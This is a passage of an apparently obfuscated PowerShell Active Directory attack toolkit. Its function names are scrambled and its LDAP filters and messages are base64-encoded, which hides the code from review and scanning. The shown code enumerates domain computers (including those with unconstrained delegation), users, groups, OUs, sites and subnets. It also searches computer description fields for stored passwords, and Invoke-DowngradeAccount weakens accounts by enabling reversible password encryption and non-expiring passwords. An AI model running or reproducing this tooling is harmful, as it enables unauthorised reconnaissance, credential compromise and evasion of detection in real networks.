            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAYgB1AGkAbABkAGkAbgBnACAARwBVAEkARAAgAG0AYQBwADoAIAAkAF8A')))
        }
    }
    ${___/\_/==\/=\/===}
}
function _/=\___/=\_______/ {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',
        [String]
        $SPN,
        [String]
        $OperatingSystem,
        [String]
        $ServicePack,
        [String]
        $Filter,
        [Switch]
        ${___/\__/\/==\__/\/},
        [Switch]
        $Ping,
        [Switch]
        $FullData,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $SiteName,
        [Switch]
        $Unconstrained,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${_/=====\__/\/\/==} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize -Credential $Credential
    }
    process {
        if (${_/=====\__/\/\/==}) {
            if($Unconstrained) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if(${___/\__/\/==\__/\/}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if($SPN) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAFMAUABOADoAIAAkAFMAUABOAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAFMAUABOACkA')))
            }
            if($OperatingSystem) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQATwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AKQA=')))
            }
            if($ServicePack) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQBjAGsAPQAkAFMAZQByAHYAaQBjAGUAUABhAGMAawApAA==')))
            }
            if($SiteName) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGUAcgByAGUAZgBlAHIAZQBuAGMAZQBiAGwAPQAkAFMAaQB0AGUATgBhAG0AZQApAA==')))
            }
            ${__/\/\__/\__/\__/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBBAE0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADkAKQAoAGQAbgBzAGgAbwBzAHQAbgBhAG0AZQA9ACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBOAGUAdABDAG8AbQBwAHUAdABlAHIAIABmAGkAbAB0AGUAcgAgADoAIAAnACQAewBfAF8ALwBcAC8AXABfAF8ALwBcAF8AXwAvAFwAXwBfAC8AfQAnAA==')))
            ${_/=====\__/\/\/==}.filter = ${__/\/\__/\__/\__/}
            try {
                ${__/==\/===\/\/\/=} = ${_/=====\__/\/\/==}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    ${/==\/\/\/=\/=\/==} = $True
                    if($Ping) {
                        ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if(${/==\/\/\/=\/=\/==}) {
                        if ($FullData) {
                            ${___/==\/\/==\/=\/} = ___/\/\/\_/\___/== -Properties $_.Properties
                            ${___/==\/\/==\/=\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
                            ${___/==\/\/==\/=\/}
                        }
                        else {
                            $_.properties.dnshostname
                        }
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${_/=====\__/\/\/==}.dispose()
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
            }
        }
    }
}
function ___/\/\/\/\/==\/\_ {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${__/\/=\/\_/\/====\},
        [String]
        $Name,
        [String]
        $SamAccountName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $Filter,
        [Switch]
        ${_/==\/=\_/=\/\_/\/},
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    process {
        if(${__/\/=\/\_/\/====\}) {
            try {
                $Name = __/\_/\_/\__/\/\/\ ${__/\/=\/\_/\/====\}
                if($Name) {
                    ${/====\__/\/\_/\/\} = _/=\/\/==\/==\_/\/ -__/\/==\_/\___/\/\ $Name -_/==\/\/=\/=\_/=\_ NT4 -___/=\/==\_/\__/== Canonical
                    if(${/====\__/\/\_/\/\}) {
                        $Domain = ${/====\__/\/\_/\/\}.split("/")[0]
                    }
                    else {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgACcAJAB7AF8AXwAvAFwALwA9AFwALwBcAF8ALwBcAC8APQA9AD0APQBcAH0AJwA=')))
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgACcAJAB7AF8AXwAvAFwALwA9AFwALwBcAF8ALwBcAC8APQA9AD0APQBcAH0AJwAgADoAIAAkAF8A')))
                return $Null
            }
        }
        ${_____/===\/=\/\__} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
        if(${_____/===\/=\/\__}) {
            if(${__/\/=\/\_/\/====\}) {
                ${_____/===\/=\/\__}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAcwBpAGQAPQAkAHsAXwBfAC8AXAAvAD0AXAAvAFwAXwAvAFwALwA9AD0APQA9AFwAfQApACQARgBpAGwAdABlAHIAKQA=')))
            }
            elseif($Name) {
                ${_____/===\/=\/\__}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbgBhAG0AZQA9ACQATgBhAG0AZQApACQARgBpAGwAdABlAHIAKQA=')))
            }
            elseif($SamAccountName) {
                ${_____/===\/=\/\__}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAKQAkAEYAaQBsAHQAZQByACkA')))
            }
            ${__/==\/===\/\/\/=} = ${_____/===\/=\/\__}.FindAll()
            ${__/==\/===\/\/\/=} | ? {$_} | % {
                if(${_/==\/=\_/=\/\_/\/}) {
                    $_
                }
                else {
                    ___/\/\/\_/\___/== -Properties $_.Properties
                }
            }
            ${__/==\/===\/\/\/=}.dispose()
            ${_____/===\/=\/\__}.dispose()
        }
    }
}
function __/\__/\__/=\__/== {
    [CmdletBinding()]
    Param (
        [String]
        ${__/\/=\/\_/\/====\},
        [String]
        $Name,
        [String]
        $SamAccountName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $Filter,
        [Parameter(Mandatory = $True)]
        [String]
        ${___/=======\/==\/\},
        ${__/\/\/====\__/\_/},
        [Int]
        ${_/=\/=\/\_/=\/\/=\},
        [Switch]
        ${__/==\/\__/===\__/},
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    ${__/\_/\/===\/=\_/} = @{
        'SID' = ${__/\/=\/\_/\/====\}
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
        'Credential' = $Credential
    }
    ${__/=\/\/==\__/===} = ___/\/\/\/\/==\/\_ -_/==\/=\_/=\/\_/\/ @__/\_/\/===\/=\_/
    try {
        ${/=\___/=\___/\__/} = ${__/=\/\/==\__/===}.GetDirectoryEntry()
        if(${__/==\/\__/===\__/}) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAGkAbgBnACAAdgBhAGwAdQBlAA==')))
            ${/=\___/=\___/\__/}.${___/=======\/==\/\}.clear()
            ${/=\___/=\___/\__/}.commitchanges()
        }
        elseif(${_/=\/=\/\_/=\/\/=\}) {
            ${_/=\_/=\_/=\/=\_/} = ${/=\___/=\___/\__/}.${___/=======\/==\/\}[0].GetType().name
            ${__/\/\/====\__/\_/} = $(${/=\___/=\___/\__/}.${___/=======\/==\/\}) -bxor ${_/=\/=\/\_/=\/\/=\} 
            ${/=\___/=\___/\__/}.${___/=======\/==\/\} = ${__/\/\/====\__/\_/} -as ${_/=\_/=\_/=\/=\_/}       
            ${/=\___/=\___/\__/}.commitchanges()     
        }
        else {
            ${/=\___/=\___/\__/}.put(${___/=======\/==\/\}, ${__/\/\/====\__/\_/})
            ${/=\___/=\___/\__/}.setinfo()
        }
    }
    catch {
        Write-Warning "Error setting property ${___/=======\/==\/\} to value '${__/\/\/====\__/\_/}' for object $(${__/=\/\/==\__/===}.Properties.samaccountname) : $_"
    }
}
function Invoke-DowngradeAccount {
    [CmdletBinding()]
    Param (
        [Parameter(ParameterSetName = 'SamAccountName', Position=0, ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [Parameter(ParameterSetName = 'Name')]
        [String]
        $Name,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $Filter,
        [Switch]
        $Repair,
        [Management.Automation.PSCredential]
        $Credential
    )
    process {
        ${__/\_/\/===\/=\_/} = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
            'Credential' = $Credential
        }
        ${_/\____/=========} = ___/\/\/\/\/==\/\_ @__/\_/\/===\/=\_/ | select useraccountcontrol | _/===\/\_/=\/====\
        if($Repair) {
            if(${_/\____/=========}.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA==')))) {
                __/\__/\__/=\__/== @__/\_/\/===\/=\_/ -___/=======\/==\/\ useraccountcontrol -_/=\/=\/\_/=\/\/=\ 128
            }
            __/\__/\__/=\__/== @__/\_/\/===\/=\_/ -___/=======\/==\/\ pwdlastset -__/\/\/====\__/\_/ -1
        }
        else {
            if(${_/\____/=========}.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA==')))) {
                __/\__/\__/=\__/== @__/\_/\/===\/=\_/ -___/=======\/==\/\ useraccountcontrol -_/=\/=\/\_/=\/\/=\ 65536
            }
            if(${_/\____/=========}.Keys -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA==')))) {
                __/\__/\__/=\__/== @__/\_/\/===\/=\_/ -___/=======\/==\/\ useraccountcontrol -_/=\/=\/\_/=\/\/=\ 128
            }
            __/\__/\__/=\__/== @__/\_/\/===\/=\_/ -___/=======\/==\/\ pwdlastset -__/\/\/====\__/\_/ 0
        }
    }
}
function Get-ComputerProperty {
    [CmdletBinding()]
    param(
        [String[]]
        $Properties,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    if($Properties) {
        $Properties = ,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) + $Properties | sort -Unique
        _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize | select -Property $Properties
    }
    else {
        _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize | select -first 1 | gm -MemberType *Property | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))
    }
}
function Find-ComputerField {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',
        [Alias('Field')]
        [String]
        $SearchField = 'description',
        [String]
        $ADSpath,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    process {
        _/=\___/=\_______/ -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -Filter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAkAFMAZQBhAHIAYwBoAEYAaQBlAGwAZAA9ACoAJABTAGUAYQByAGMAaABUAGUAcgBtACoAKQA='))) -PageSize $PageSize | select samaccountname,$SearchField
    }
}
function __/\/=\_/=\/==\/\_ {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',
        [String]
        ${__/\__/\______/\__},
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${__/\____/\_/==\_/} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if (${__/\____/\_/==\_/}) {
            if (${__/\__/\______/\__}) {
                ${__/\____/\_/==\_/}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAoAG4AYQBtAGUAPQAkAE8AVQBOAGEAbQBlACkAKABnAHAAbABpAG4AawA9ACoAJAB7AF8AXwAvAFwAXwBfAC8AXABfAF8AXwBfAF8AXwAvAFwAXwBfAH0AKgApACkA')))
            }
            else {
                ${__/\____/\_/==\_/}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAoAG4AYQBtAGUAPQAkAE8AVQBOAGEAbQBlACkAKQA=')))
            }
            try {
                ${__/==\/===\/\/\/=} = ${__/\____/\_/==\_/}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    if ($FullData) {
                        ${_____/=\_/===\_/\} = ___/\/\/\_/\___/== -Properties $_.Properties
                        ${_____/=\_/===\_/\}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                        ${_____/=\_/===\_/\}
                    }
                    else { 
                        $_.properties.adspath
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${__/\____/\_/==\_/}.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function _/==\_/===\____/== {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        ${__/\__/\______/\__},
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${/\_____/===\/\/=\} = __/=====\_/\_/==== -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSprefix $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA='))) -PageSize $PageSize
    }
    process {
        if(${/\_____/===\/\/=\}) {
            if (${__/\__/\______/\__}) {
                ${/\_____/===\/\/=\}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACgAbgBhAG0AZQA9ACQAUwBpAHQAZQBOAGEAbQBlACkAKABnAHAAbABpAG4AawA9ACoAJAB7AF8AXwAvAFwAXwBfAC8AXABfAF8AXwBfAF8AXwAvAFwAXwBfAH0AKgApACkA')))
            }
            else {
                ${/\_____/===\/\/=\}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACgAbgBhAG0AZQA9ACQAUwBpAHQAZQBOAGEAbQBlACkAKQA=')))
            }
            try {
                ${__/==\/===\/\/\/=} = ${/\_____/===\/\/=\}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    if ($FullData) {
                        ${/==\/\_/\_/\/\/==} = ___/\/\/\_/\___/== -Properties $_.Properties
                        ${/==\/\_/\_/\/\/==}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                        ${/==\/\_/\_/\/\/==}
                    }
                    else {
                        $_.properties.name
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${/\_____/===\/\/=\}.dispose()
            }
            catch {
                Write-Verbose $_
            }
        }
    }
}
function Get-NetSubnet {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",
        [String]
        $Domain,
        [String]
        $ADSpath,
        [String]
        $DomainController,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${/=\/\_/=\_/======} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -ADSprefix $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A'))) -PageSize $PageSize
    }
    process {
        if(${/=\/\_/=\_/======}) {
            ${/=\/\_/=\_/======}.filter=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQApAA==')))
            try {
                ${__/==\/===\/\/\/=} = ${/=\/\_/=\_/======}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    if ($FullData) {
                        ___/\/\/\_/\___/== -Properties $_.Properties | ? { $_.siteobject -match $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AJABTAGkAdABlAE4AYQBtAGUA'))) }
                    }
                    else {
                        if ( ($SiteName -and ($_.properties.siteobject -match $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AJABTAGkAdABlAE4AYQBtAGUALAA='))))) -or ($SiteName -eq '*')) {
                            ${/=\/==\/=\/===\__} = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                ${/=\/==\/=\/===\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQA=')))] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                ${/=\/==\/=\/===\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA==')))
                            }
                            New-Object -TypeName PSObject -Property ${/=\/==\/=\/===\__}
                        }
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${/=\/\_/=\_/======}.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function __/=\_/=\___/\_/== {
    param(
        [String]
        $Domain,
        [String]
        $DomainController
    )
    ${/=\_____/\/\_/=\/} = _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)' | select -First 1 -ExpandProperty objectsid
    if(${/=\_____/\/\_/=\/}) {
        ${/=\_____/\/\_/=\/}.Substring(0, ${/=\_____/\/\_/=\/}.LastIndexOf('-'))
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZQB4AHQAcgBhAGMAdABpAG4AZwAgAGQAbwBtAGEAaQBuACAAUwBJAEQAIABmAG8AcgAgACQARABvAG0AYQBpAG4A')))
    }
}
function _____/\/===\/=\/== {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',
        [String]
        ${__/\/=\/\_/\/====\},
        [String]
        $UserName,
        [String]
        $Filter,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        ${____/====\____/\_/},
        [Switch]
        $FullData,
        [Switch]
        ${_/====\/=\/==\_/\_},
        [Switch]
        ${___/\_/=\_/\/=\_/\},
        [ValidateRange(1,10000)]
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${____/==\/===\/\/\} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
        if (!${___/\_/=\_/\/=\_/\})
        {
          $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA=')))
        }
    }
    process {
        if(${____/==\/===\/\/\}) {
            if(${____/====\____/\_/}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($UserName) {
                ${_/\_/=\/\/=\_/===} = ___/\/\/\/\/==\/\_ -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -Credential $Credential -_/==\/=\_/=\/\_/\/ -PageSize $PageSize | select -First 1
                if(${_/\_/=\/\/=\_/===}) {
                    ${__/\/=\___/\/=\__} = ${_/\_/=\/\/=\_/===}.GetDirectoryEntry()
                    ${__/\/=\___/\/=\__}.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    ${__/\/=\___/\/=\__}.TokenGroups | % {
                        ${/====\_/\_/==\/=\} = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if(${/====\_/\_/==\/=\} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            if($FullData) {
                                ${_/=\/\/=\_/\__/\/} = ___/\/\/\/\/==\/\_ -__/\/=\/\_/\/====\ ${/====\_/\_/==\/=\} -PageSize $PageSize -Domain $Domain -DomainController $DomainController -Credential $Credential
                                ${_/=\/\/=\_/\__/\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                                ${_/=\/\/=\_/\__/\/}
                            }
                            else {
                                if(${_/====\/=\/==\_/\_}) {
                                    ${/====\_/\_/==\/=\}
                                }
                                else {
                                    __/\_/\_/\__/\/\/\ -__/\/=\/\_/\/====\ ${/====\_/\_/==\/=\}
                                }
                            }
                        }
                    }
                }
                else {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlACAAJwAkAFUAcwBlAHIATgBhAG0AZQAnACAAZgBhAGkAbABlAGQAIAB0AG8AIAByAGUAcwBvAGwAdgBlAC4A')))
                }
            }
            else {
                if (${__/\/=\/\_/\/====\}) {
                    ${____/==\/===\/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABvAGIAagBlAGMAdABTAEkARAA9ACQAewBfAF8ALwBcAC8APQBcAC8AXABfAC8AXAAvAD0APQA9AD0AXAB9ACkAJABGAGkAbAB0AGUAcgApAA==')))
                }
                else {
                    ${____/==\/===\/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAPQAkAEcAcgBvAHUAcABOAGEAbQBlACkAJABGAGkAbAB0AGUAcgApAA==')))
                }
                ${__/==\/===\/\/\/=} = ${____/==\/===\/\/\}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    if ($FullData) {
                        ${_/=\/\/=\_/\__/\/} = ___/\/\/\_/\___/== -Properties $_.Properties
                        ${_/=\/\/=\_/\__/\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                        ${_/=\/\/=\_/\__/\/}
                    }
                    else {
                        $_.properties.samaccountname
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${____/==\/===\/\/\}.dispose()
            }
        }
    }
}
function _/\____/=\__/\/\/\ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,
        [String]
        ${__/\/=\/\_/\/====\},
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $FullData,
        [Switch]
        $Recurse,
        [Switch]
        ${___/==\/\_/==\/=\_},
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        if($DomainController) {
            ${__/==\___/\_/====} = $DomainController
        }
        else {
            ${__/==\___/\_/====} = ((______/====\/=\__/ -Credential $Credential).PdcRoleOwner).Name
        }
        if($Domain) {
            ${____/=\/===\/=\_/} = $Domain
        }
        else {
            ${____/=\/===\/=\_/} = ______/====\/=\__/ -Credential $Credential | select -ExpandProperty name
        }
